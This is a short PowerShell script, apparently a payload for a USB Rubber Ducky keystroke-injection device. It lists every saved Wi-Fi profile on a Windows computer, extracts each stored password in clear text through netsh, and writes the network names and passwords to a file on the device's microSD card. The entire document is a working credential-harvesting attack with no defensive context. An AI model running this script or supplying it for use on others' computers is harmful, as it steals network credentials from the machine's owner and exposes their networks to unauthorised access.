# Define the filename using the current user's name and computer name
$filename = "$env:COMPUTERNAME`_WIFI.txt"
$outputPath = "E:\$filename"  # Specify the path on the Rubber Ducky's microSD card (E: drive)

# Get the list of Wi-Fi profiles on the machine
$profiles = netsh wlan show profiles

# Loop through each profile and extract the Wi-Fi password (if available)
foreach ($profile in $profiles) {
    # Check if the line contains the profile name (SSID)
    if ($profile -match "All User Profile\s*:\s*(.*)") {
        $profileName = $matches[1].Trim()

        # Get the key content (password) for the current profile
        $keyContent = netsh wlan show profile "$profileName" key=clear | Select-String "Key Content" | ForEach-Object { $_.Line.Split(":")[1].Trim() }

        # If a password exists, write the profile and password to the file
        if ($keyContent) {
            "${profileName}: $keyContent" | Out-File -Append -FilePath $outputPath
        }
    }
}
